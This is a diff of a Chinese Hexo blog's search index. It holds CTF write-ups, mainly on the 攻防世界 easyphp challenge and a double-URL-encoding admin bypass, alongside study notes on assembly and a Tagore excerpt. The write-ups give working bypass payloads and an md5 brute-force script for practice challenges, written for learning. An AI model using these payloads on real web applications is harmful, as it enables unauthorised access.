class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>查看传参类型以及数量<br>我们通看整个页面，发现需要传a,b,c三个参数，且均以GET方式传递。</p>
 </li>
-<li><p>分析条件<br>我们看到源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
-<p>第1个if语句：要求不能直接在url栏输入admin，否则不予通过。<br>第2个if语句：url解码后的值要与admin相同。</p>
-</li>
-<li><p>构造语句<br>url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。<br>因此我们将a进行url编码，可得到%61dmin<br>解码后与admin值相同。<br>但这样还不够，因为url栏会先对传上的值解一次码，变成admin，这样在判断第1个if语句时仍然无法通过。<br>因此我们需要二次编码绕过。将%61再次进行编码：%2561<br>最终得到： <code>%2561dmin</code><br>最后拿到flag</p>
+<li><p>参数a的要求<br>我们重点看这段源代码：<br><code>if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset() 	判断参数的值是否存在</span><br><span class="line">intval()	用于获取变量的整数值</span><br><span class="line">strlen()	判断参数长度</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.runoob.com/php/php-intval-function.html">intval()函数</a></p>
 </li>
 </ol>
+<p>函数的作用搞清楚后，接下来便是弄清楚符合的条件。<br>既要参数a的值大于600000又要长度小于3，那么只能用科学计数法。<br>当a&#x3D;1e5时，十进制数值为10000<br>由此可知，参数a的选值可以为:1e7&#x2F;8&#x2F;9</p>
+<ol start="3">
+<li>参数b的要求<br>我们重点看这段源代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr 	返回字符串的一部分</span><br><span class="line">md5 	计算括号内参数的md5值</span><br></pre></td></tr></table></figure>
+<a href="https://www.runoob.com/php/func-string-substr.html">substr()函数</a></li>
+</ol>
+<p>这段代码翻译过来意思为：<br>参数b的md5值的最后6位是否全等于’8b184b’。<br>这种情况我们用手算是无法计算的，于是需要用PHP写一个简单的脚本来获取符合条件的值：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终得出参数b的值为：53724</p>
+<ol start="4">
+<li>参数c的要求<br>我们重点看这段代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>确定c[“m”]的值<br>通过代码可知，我们需要json格式的参数c。<br>参数c需要满足数组格式，且c[“m”]的类型不能为数字类型，且c[“m”]的值需要大于2022。<br>我们知道在php中，当字符串的首位为字符，并与整数比较时，字符串的值会转化为0，举例而言就是’a123’会变成0；<br>但是当字符串首位为数字，并与整数比较时，此时字符串会将字符之前的数字与整数比较，比如：’1a23’会变为1，’123a’会变为123</li>
+</ul>
+<p>于是我们可以构造出c[“m”]的值为：12345a</p>
+<ul>
+<li>确定c[“n”]的值<br>通过代码可知c[“n”]的类型为数组，且数组中有2个值，且c[“n”][0]的类型也是数组。大致为[[x,x,…],x]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_search 	在数组中搜索某个键值，并返回对应的键名</span><br></pre></td></tr></table></figure>
+<a href="https://www.runoob.com/php/func-array-search.html">array_search()函数</a><br>可知该函数是查找值相同的元素，那么类型不同也可以。<br>那么此时就产生了两种可选的值：0或’DGGJ’<br>但由于下面的foreach不能与DGGJ匹配，因此我们只能选0<br>因此c[“n”]的值为：[[0,2],0]</li>
+</ul>
+<p>最终payload为：<br><code>/?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;12345a&quot;, &quot;n&quot;:[[0,2],0]&#125;</code><br>提交得到flag。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这道题倒是让我受到不少收获，感觉蛮好。是我应该会却不会的内容，代码审计能力提升了~</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_46906325/article/details/127154789">攻防世界web新手区easyphp题解writeup</a><br><a href="https://blog.csdn.net/qq_56426046/article/details/127194240?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-127194240-blog-127154789.pc_relevant_3mothn_strategy_recovery&spm=1001.2101.3001.4242.1&utm_relevant_index=3">攻防世界easyphp解题wp</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -4593,56 +4811,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界_easyphp</title>
-    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了这题才知道自己的php掌握的有多么糟糕…</p>
-<span id="more"></span>
-<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界-&gt;easyphp</p>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>首先是页面代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>查看传参类型以及数量<br>我们通看整个页面，发现需要传a,b,c三个参数，且均以GET方式传递。</p>
-</li>
-<li><p>参数a的要求<br>我们重点看这段源代码：<br><code>if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset() 	判断参数的值是否存在</span><br><span class="line">intval()	用于获取变量的整数值</span><br><span class="line">strlen()	判断参数长度</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.runoob.com/php/php-intval-function.html">intval()函数</a></p>
-</li>
-</ol>
-<p>函数的作用搞清楚后，接下来便是弄清楚符合的条件。<br>既要参数a的值大于600000又要长度小于3，那么只能用科学计数法。<br>当a&#x3D;1e5时，十进制数值为10000<br>由此可知，参数a的选值可以为:1e7&#x2F;8&#x2F;9</p>
-<ol start="3">
-<li>参数b的要求<br>我们重点看这段源代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr 	返回字符串的一部分</span><br><span class="line">md5 	计算括号内参数的md5值</span><br></pre></td></tr></table></figure>
-<a href="https://www.runoob.com/php/func-string-substr.html">substr()函数</a></li>
-</ol>
-<p>这段代码翻译过来意思为：<br>参数b的md5值的最后6位是否全等于’8b184b’。<br>这种情况我们用手算是无法计算的，于是需要用PHP写一个简单的脚本来获取符合条件的值：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>最终得出参数b的值为：53724</p>
-<ol start="4">
-<li>参数c的要求<br>我们重点看这段代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li>确定c[“m”]的值<br>通过代码可知，我们需要json格式的参数c。<br>参数c需要满足数组格式，且c[“m”]的类型不能为数字类型，且c[“m”]的值需要大于2022。<br>我们知道在php中，当字符串的首位为字符，并与整数比较时，字符串的值会转化为0，举例而言就是’a123’会变成0；<br>但是当字符串首位为数字，并与整数比较时，此时字符串会将字符之前的数字与整数比较，比如：’1a23’会变为1，’123a’会变为123</li>
-</ul>
-<p>于是我们可以构造出c[“m”]的值为：12345a</p>
-<ul>
-<li>确定c[“n”]的值<br>通过代码可知c[“n”]的类型为数组，且数组中有2个值，且c[“n”][0]的类型也是数组。大致为[[x,x,…],x]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_search 	在数组中搜索某个键值，并返回对应的键名</span><br></pre></td></tr></table></figure>
-<a href="https://www.runoob.com/php/func-array-search.html">array_search()函数</a><br>可知该函数是查找值相同的元素，那么类型不同也可以。<br>那么此时就产生了两种可选的值：0或’DGGJ’<br>但由于下面的foreach不能与DGGJ匹配，因此我们只能选0<br>因此c[“n”]的值为：[[0,2],0]</li>
-</ul>
-<p>最终payload为：<br><code>/?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;12345a&quot;, &quot;n&quot;:[[0,2],0]&#125;</code><br>提交得到flag。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这道题倒是让我受到不少收获，感觉蛮好。是我应该会却不会的内容，代码审计能力提升了~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_46906325/article/details/127154789">攻防世界web新手区easyphp题解writeup</a><br><a href="https://blog.csdn.net/qq_56426046/article/details/127194240?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-127194240-blog-127154789.pc_relevant_3mothn_strategy_recovery&spm=1001.2101.3001.4242.1&utm_relevant_index=3">攻防世界easyphp解题wp</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -4861,6 +5029,34 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>汇编语言期末复习</title>
+    <url>/2022/12/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>烦内！一到期末就不想复习了，真是的。<br>还是要强迫自己学习哇。</p>
+<span id="more"></span>
+<h1 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h1><h2 id="源码、反码、补码、移码之间的转换"><a href="#源码、反码、补码、移码之间的转换" class="headerlink" title="源码、反码、补码、移码之间的转换"></a>源码、反码、补码、移码之间的转换</h2><p>源码为正数时，<br>源码&#x3D;反码&#x3D;补码，移码&#x3D;补码+127<br>源码为负数时，<br>反码：符号位不变，其它位取反<br>补码：反码+1<br>移码：补码符号位取反</p>
+<h2 id="有符号字节-amp-字"><a href="#有符号字节-amp-字" class="headerlink" title="有符号字节 &amp; 字"></a>有符号字节 &amp; 字</h2><ul>
+<li>有符号字节<br>数值范围：-128<del>127或-2^7</del>2^7-1</li>
+<li>有符号字<br>数值范围：-32768<del>32767或-2^15</del>2^15-1</li>
+</ul>
+<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>计算机采用字符集的方式表示字符。<br>所谓字符集，就是一张映射表，用哪个数字表示哪个符号<br>常用字符集有：ASCII，ANSI，Unicode，GB2312，UTF-8</p>
+<h1 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h1><h2 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h2><ol>
+<li>保护模式。处理器的基本模式，所有指令和特性均相同，程序具备独立的内存段，地址线32位，4GB地址空间。</li>
+<li>虚拟8086模式。是保护模式的一个特例，处理器可以安全地在多任务系统中执行实地址模式的软件，而不会影响其它运行的程序，地址线20位，1MB地址空间。</li>
+<li>实地址模式。具有基本x86处理器环境和一些新增的特性，能够直接访问内存和硬件资源，地址线20位，1MB地址空间。</li>
+<li>系统管理模式。实现电源管理和系统安全等。</li>
+</ol>
+<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p><img src="/simg/Assembly_1.png" alt="通用寄存器"></p>
+<h2 id="状态标志位"><a href="#状态标志位" class="headerlink" title="状态标志位"></a>状态标志位</h2><p>进位标志位(CF)，与目标位置相比，无符号算数运算结果太大时，设置该标志位。<br>溢出标志位(OF)，与目标位置相比，有符号算术运算符太大或太小时，设置该标志位。</p>
+<p>完全不想写了…</p>
+]]></content>
+      <categories>
+        <category>汇编语言</category>
+      </categories>
+      <tags>
+        <tag>汇编语言</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>时间盲注</title>
     <url>/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
@@ -4903,34 +5099,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>汇编语言期末复习</title>
-    <url>/2022/12/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>烦内！一到期末就不想复习了，真是的。<br>还是要强迫自己学习哇。</p>
-<span id="more"></span>
-<h1 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h1><h2 id="源码、反码、补码、移码之间的转换"><a href="#源码、反码、补码、移码之间的转换" class="headerlink" title="源码、反码、补码、移码之间的转换"></a>源码、反码、补码、移码之间的转换</h2><p>源码为正数时，<br>源码&#x3D;反码&#x3D;补码，移码&#x3D;补码+127<br>源码为负数时，<br>反码：符号位不变，其它位取反<br>补码：反码+1<br>移码：补码符号位取反</p>
-<h2 id="有符号字节-amp-字"><a href="#有符号字节-amp-字" class="headerlink" title="有符号字节 &amp; 字"></a>有符号字节 &amp; 字</h2><ul>
-<li>有符号字节<br>数值范围：-128<del>127或-2^7</del>2^7-1</li>
-<li>有符号字<br>数值范围：-32768<del>32767或-2^15</del>2^15-1</li>
-</ul>
-<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>计算机采用字符集的方式表示字符。<br>所谓字符集，就是一张映射表，用哪个数字表示哪个符号<br>常用字符集有：ASCII，ANSI，Unicode，GB2312，UTF-8</p>
-<h1 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h1><h2 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h2><ol>
-<li>保护模式。处理器的基本模式，所有指令和特性均相同，程序具备独立的内存段，地址线32位，4GB地址空间。</li>
-<li>虚拟8086模式。是保护模式的一个特例，处理器可以安全地在多任务系统中执行实地址模式的软件，而不会影响其它运行的程序，地址线20位，1MB地址空间。</li>
-<li>实地址模式。具有基本x86处理器环境和一些新增的特性，能够直接访问内存和硬件资源，地址线20位，1MB地址空间。</li>
-<li>系统管理模式。实现电源管理和系统安全等。</li>
-</ol>
-<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p><img src="/simg/Assembly_1.png" alt="通用寄存器"></p>
-<h2 id="状态标志位"><a href="#状态标志位" class="headerlink" title="状态标志位"></a>状态标志位</h2><p>进位标志位(CF)，与目标位置相比，无符号算数运算结果太大时，设置该标志位。<br>溢出标志位(OF)，与目标位置相比，有符号算术运算符太大或太小时，设置该标志位。</p>
-<p>完全不想写了…</p>
-]]></content>
-      <categories>
-        <category>汇编语言</category>
-      </categories>
-      <tags>
-        <tag>汇编语言</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>浅谈爱国</title>
     <url>/2022/11/26/%E6%B5%85%E8%B0%88%E7%88%B1%E5%9B%BD/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>爱国，似乎是一个不具有讨论性的话题。可能随便在街上问一个人，爱不爱国？恐怕都会答曰：爱国。<br>我仍然想讨论这个话题。</p>
@@ -4970,6 +5138,30 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>飞鸟集--摘抄</title>
+    <url>/2022/11/18/%E9%A3%9E%E9%B8%9F%E9%9B%86_%E6%91%98%E6%8A%84/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近突然想起了泰戈尔的飞鸟集里的一些诗，来了兴致，便又重读了飞鸟集，不由得感叹，诗真美啊。这样的美，大概是永恒吧。</p>
+<span id="more"></span>
+<h1 id="喜欢的句子"><a href="#喜欢的句子" class="headerlink" title="喜欢的句子"></a>喜欢的句子</h1><ol>
+<li>It is the tears of the earth that keep here smiles in bloom.<br>是大地的泪点，使她的微笑保持着青春不谢。</li>
+<li>If you shed tears when you miss the sun, you also miss the stars.<br>如果你因失去了太阳而流泪，那么你也将失去群星了。</li>
+<li>Her wishful face haunts my dreams like the rain at night.<br>她的热切的脸，如夜雨似的，搅扰着我的梦魂。</li>
+<li>Sorrow is hushed into peace in my heart like the evening among the silent trees.<br>忧思在我的心里平静下去，正如暮色降临在寂静的山林中。</li>
+<li>Do not seat your love upon a precipice because it is high.<br>不要因为峭壁是高的，便让你的爱情坐在峭壁上。</li>
+<li>What you are you do not see, what you see is your shadow.<br>你看不见你自己，你所看见的只是你的影子。</li>
+<li>His own mornings are new surprises to God.<br>神自己的清晨，在他自己看来也是新奇的。</li>
+</ol>
+<p>未完待续…</p>
